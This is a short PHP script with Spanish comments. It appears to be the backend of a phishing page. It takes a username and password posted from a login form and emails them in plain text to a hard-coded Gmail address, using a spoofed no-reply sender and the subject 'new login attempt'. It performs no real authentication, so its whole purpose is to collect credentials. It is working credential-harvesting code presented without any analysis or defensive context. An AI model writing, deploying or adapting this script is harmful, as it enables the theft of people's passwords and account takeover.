<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Enviar el correo con los datos
    $to = "carlangam.j@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@tu-dominio.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado correctamente";
    } else {
        echo "Error al enviar el correo";
    }
} else {
    echo "Método no permitido";
}
?>
